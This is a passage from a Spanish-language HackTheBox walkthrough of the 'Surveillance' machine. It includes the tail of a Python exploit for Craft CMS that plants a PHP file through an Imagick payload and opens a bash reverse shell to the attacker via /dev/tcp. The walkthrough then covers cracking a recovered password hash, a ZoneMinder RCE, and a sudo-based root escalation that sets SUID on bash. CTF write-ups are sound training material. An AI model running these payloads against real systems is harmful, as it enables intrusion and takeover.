        <span class="s">"config"</span><span class="p">:</span> <span class="s">'{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:'</span> <span class="o">+</span> <span class="s">"/tmp"</span> <span class="o">+</span> <span class="sa">r</span><span class="s">'/php*"}}}'</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">get_shell</span><span class="p">(</span><span class="n">your_ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span> <span class="c1">#Enviamos la shell hacia el puerto indicado por el usuario
</span>
    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Ponte en escucha por el puerto </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">execute_shell</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'bash -c "bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">your_ip</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s"> 0&gt;&amp;1"'</span>

    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"ts"</span><span class="p">:</span> <span class="n">execute_shell</span><span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">"/cpresources/ts.php"</span> <span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="k">global</span> <span class="n">target</span>
    <span class="n">target</span><span class="p">,</span> <span class="n">your_ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">get_target</span><span class="p">()</span>
    <span class="n">target</span> <span class="o">=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">target</span>
    <span class="n">web_route</span> <span class="o">=</span> <span class="n">get_route_web</span><span class="p">()</span>
    <span class="n">write_payload</span><span class="p">(</span><span class="n">web_route</span><span class="p">)</span>
    <span class="n">execute_msl</span><span class="p">()</span>
    <span class="n">get_shell</span><span class="p">(</span><span class="n">your_ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>

    <span class="n">main</span><span class="p">()</span>

</pre></table></code></div></div><p>Una vez ejecutado el script, estamos dentro de la máquina. Después de buscar un largo rato por algún archivo interesante en el servidor, encontré <strong>surveillance–2023-10-17-202801–v4.4.14.sql.zip</strong> bajo la ruta <strong>/var/www/html/craft/storage/backups</strong>. Lo que haré será traerme ese archivo comprimido a mi equipo y descomprimirlo.</p><p>Ya que es un archivo muy grande al descomprimirlo, lo que haré será grepear por “username” y luego por el usuario que encontré el cual es “Matthew” y veremos la contraseña del usuario cifrada.</p><p><img data-src="/assets/img/commons/Surveillance/database.png" alt="CommandGrep" class="center-image" data-proofer-ignore> <em>Grep DataBase File</em></p><p>Ahora lo que haré será ver qué tipo de hash es mediante <strong>hash-identifier</strong></p><p><img data-src="/assets/img/commons/Surveillance/hash.png" alt="IdentifyHash" class="center-image" data-proofer-ignore> <em>Identify hash</em></p><p>Ya que el hash es <strong>sha256</strong> lo crackearé con John utilizando el <strong>rockyou.txt</strong>. Luego ingresaré por SSH utilizando la contraseña del usuario <strong>matthew</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec"</span> <span class="o">&gt;</span> <span class="nb">hash</span>
❯ john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash</span> <span class="nt">--format</span><span class="o">=</span>Raw-SHA256
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-SHA256 <span class="o">[</span>SHA256 256/256 AVX2 8x]<span class="o">)</span>
Warning: poor OpenMP scalability <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>8
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
starcraft1  <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2023-12-17 20:39<span class="o">)</span> 5.882g/s 21588Kp/s 21588Kc/s 21588KC/s stefon23..sn283437
Use the <span class="s2">"--show --format=Raw-SHA256"</span> options to display all of the cracked passwords reliably
Session completed.
</pre></table></code></div></div><h2 id="user-pivoting"><span class="mr-2">User Pivoting</span><a href="#user-pivoting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Veo los puertos internos abiertos y veo el <strong>8080</strong> el cual contiene una página</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>matthew@surveillance:~<span class="nv">$ </span>ss <span class="nt">-nltp</span>
State          Recv-Q         Send-Q                 Local Address:Port                 Peer Address:Port        Process
LISTEN         0              80                         127.0.0.1:3306                      0.0.0.0:<span class="k">*</span>
LISTEN         0              511                        127.0.0.1:8080                      0.0.0.0:<span class="k">*</span>
LISTEN         0              511                          0.0.0.0:80                        0.0.0.0:<span class="k">*</span>
LISTEN         0              4096                   127.0.0.53%lo:53                        0.0.0.0:<span class="k">*</span>
LISTEN         0              128                          0.0.0.0:22                        0.0.0.0:<span class="k">*</span>
LISTEN         0              128                             <span class="o">[</span>::]:22                           <span class="o">[</span>::]:<span class="k">*</span>
</pre></table></code></div></div><p>Lo que haré será a través de ssh realizar un forward para que el puerto <strong>8080</strong> de la máquina víctima sea mi puerto <strong>8080</strong> local</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ ssh matthew@10.10.11.245 <span class="nt">-L</span> 8080:127.0.0.1:8080
</pre></table></code></div></div><p>Luego vi la Web y utilizaban <strong>Zoneminder</strong>, un software para <strong>CCTV</strong>, busqué vulnerabilidades para ese software y encontré un <a href="https://github.com/rvizx/CVE-2023-26035">RCE</a> sin estar autenticados junto a un exploit. En este caso se abusa del <strong>csrftoken</strong> hardcodeado en el código del servidor y junto a ciertos parámetros (incluyendo el csrftoken) se logra la ejecución. Ahora somos el usuario <strong>ZoneMinder</strong></p><h2 id="privesc"><span class="mr-2">Privesc</span><a href="#privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Haciendo un <strong>sudo -l</strong> para ver qué permisos de Sudoers tiene el usuario veo lo siguiente</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>zoneminder@surveillance:/usr/share/zoneminder/www<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>zoneminder on surveillance:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/zm[a-zA-Z]<span class="k">*</span>.pl <span class="k">*</span>
zoneminder@surveillance:/usr/share/zoneminder/www<span class="err">$</span>
</pre></table></code></div></div><p>Hago un grepeo utilizando la misma expresión regular que hay en los permisos de sudoers, para ver qué archivos hay que tengan esa estructura</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>zoneminder@surveillance:/usr/bin<span class="nv">$ </span><span class="nb">ls</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'^zm[a-zA-Z]+\.pl$'</span> | xargs <span class="nb">ls</span> <span class="nt">-la</span>
<span class="nt">-rwxr-xr-x</span> 1 root root 43027 Nov 23  2022 zmaudit.pl
<span class="nt">-rwxr-xr-x</span> 1 root root 12939 Nov 23  2022 zmcamtool.pl
<span class="nt">-rwxr-xr-x</span> 1 root root  6043 Nov 23  2022 zmcontrol.pl
<span class="nt">-rwxr-xr-x</span> 1 root root 26232 Nov 23  2022 zmdc.pl
<span class="nt">-rwxr-xr-x</span> 1 root root 35206 Nov 23  2022 zmfilter.pl
<span class="nt">-rwxr-xr-x</span> 1 root root 13994 Nov 23  2022 zmpkg.pl
<span class="nt">-rwxr-xr-x</span> 1 root root 17492 Nov 23  2022 zmrecover.pl
<span class="nt">-rwxr-xr-x</span> 1 root root  4815 Nov 23  2022 zmstats.pl
<span class="nt">-rwxr-xr-x</span> 1 root root  2133 Nov 23  2022 zmsystemctl.pl
<span class="nt">-rwxr-xr-x</span> 1 root root 13111 Nov 23  2022 zmtelemetry.pl
<span class="nt">-rwxr-xr-x</span> 1 root root  5340 Nov 23  2022 zmtrack.pl
<span class="nt">-rwxr-xr-x</span> 1 root root 18482 Nov 23  2022 zmtrigger.pl
<span class="nt">-rwxr-xr-x</span> 1 root root 45421 Nov 23  2022 zmupdate.pl
<span class="nt">-rwxr-xr-x</span> 1 root root  8205 Nov 23  2022 zmvideo.pl
<span class="nt">-rwxr-xr-x</span> 1 root root  7022 Nov 23  2022 zmwatch.pl
</pre></table></code></div></div><p>Veo que hay distintos archivos. Hay uno que me llama la atención y es <strong>zmupdate</strong>, analizando un poco la manera en la que se ejecuta veo que es para actualizar la base de datos de <strong>zoneminder</strong>, para ello me pide las credenciales de la base de datos de dicho software, entonces lo que haré será buscar en el sistema dónde está el archivo de configuración de la base de datos.</p><p>Descubro que la ruta donde se almacena la Web es en <strong>/usr/share/zoneminder</strong> con el comando <strong>find / -group zoneminder 2&gt;/dev/null</strong></p><p>Yendome a la ruta veo el <strong>www</strong>, entro ahí y ejecuto lo siguiente para buscar de manera recursiva por la palabra “password” en todos los archivos bajo el directorio actual de trabajo:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>zoneminder@surveillance:/usr/share/zoneminder/www<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"password"</span>
</pre></table></code></div></div><p>Y sopresa!. Encontré la contraseña de la base de datos de <strong>Zoneminder</strong></p><p><img data-src="/assets/img/commons/Surveillance/passdatabase.png" alt="PasswordDB" class="center-image" data-proofer-ignore> <em>Password DB</em></p><p>Ahora sí, podemos proceder a la explotación del script escrito en <strong>perl</strong>. Lo que haré será actualizar la versión de la base de datos a la <strong>1</strong> (está en la versión 1.36.32, es decir la estamos degradando) para efectuar la actualización, ya que el script lo que se supone que hace es actualizar algo en la base de datos. Luego a nivel de usuario metemos lo que queremos ejecutar, en mi caso crearé un archivo en <strong>/dev/shm</strong> (Una ruta temporal del sistema que de ella poco se habla eh!) el cual será <strong>test.sh</strong>, con el siguiente contenido:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="nb">chmod </span>u+s /bin/bash
</pre></table></code></div></div><p>Lo que haré será asignarle el permiso SUID a la bash, luego ejecuto el script con los siguientes parámetros (Luego de realizar algunas pruebas descubrí que realmente no necesitas la contraseña de la base de datos, pero bueno, al menos ya sabes cómo buscar con grep xd)</p><p><img data-src="/assets/img/commons/Surveillance/privesc.png" alt="Privesc" class="center-image" data-proofer-ignore> <em>Privesc</em></p><p>Y listo! obtenemos root, espero te haya gustado el Writeup y si quieres dejame el respect de HTB adjunto acá mismo en mi blog. Si quieres comentarme algo escribeme a mi Twitter al DM. Hasta el próximo Writeup!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Surveillance+Writeup+-+Miguel3023&url=%2Fposts%2FWriteup-Surveillance%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Surveillance+Writeup+-+Miguel3023&u=%2Fposts%2FWriteup-Surveillance%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2FWriteup-Surveillance%2F&text=Surveillance+Writeup+-+Miguel3023" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Writeup-Surveillance/">Surveillance Writeup</a><li><a href="/posts/writeup-broscience/">BroScience Writeup</a><li><a href="/posts/crackeo-contrase%C3%B1as/">Crackeo Contraseñas</a><li><a href="/posts/rbcd-attack/">Resource-Based Constrained Delegation Attack</a><li><a href="/posts/NoSQLI/">NoSQLI</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/commandinjection/">CommandInjection</a> <a class="post-tag" href="/tags/sudoers/">Sudoers</a> <a class="post-tag" href="/tags/cache-deception/">Cache Deception</a> <a class="post-tag" href="/tags/cracking-passwords/">Cracking Passwords</a> <a class="post-tag" href="/tags/cracking/">Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-forgot/"><div class="card-body"> <em class="small" data-ts="1668834000" data-df="DD/MM/YYYY" > 19/11/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Forgot Writeup</h3><div class="text-muted small"><p> En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del priv...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-broscience/"><div class="card-body"> <em class="small" data-ts="1673240400" data-df="DD/MM/YYYY" > 09/01/2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BroScience Writeup</h3><div class="text-muted small"><p> En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-Soccer/"><div class="card-body"> <em class="small" data-ts="1671426000" data-df="DD/MM/YYYY" > 19/12/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Soccer Writeup</h3><div class="text-muted small"><p> En esta máquina veremos cómo podemos subir un archivo en php para ejecutar comandos de manera remota, vemos cómo podemos en base a una SQL Injection y con un websocket podemos ver la base de datos ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/writeup-broscience/" class="btn btn-outline-primary" prompt="Anterior"><p>BroScience Writeup</p></a><div class="btn btn-outline-primary disabled" prompt="Nuevo"><p>-</p></div></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/commandinjection/">CommandInjection</a> <a class="post-tag" href="/tags/sudoers/">Sudoers</a> <a class="post-tag" href="/tags/cache-deception/">Cache Deception</a> <a class="post-tag" href="/tags/cracking-passwords/">Cracking Passwords</a> <a class="post-tag" href="/tags/cracking/">Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/AngelMiguel3023">miguel3023</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Hecho con <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> usando el tema <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> .</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p><button type="button" class="btn btn-primary" aria-label="Update"> Actualizar </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
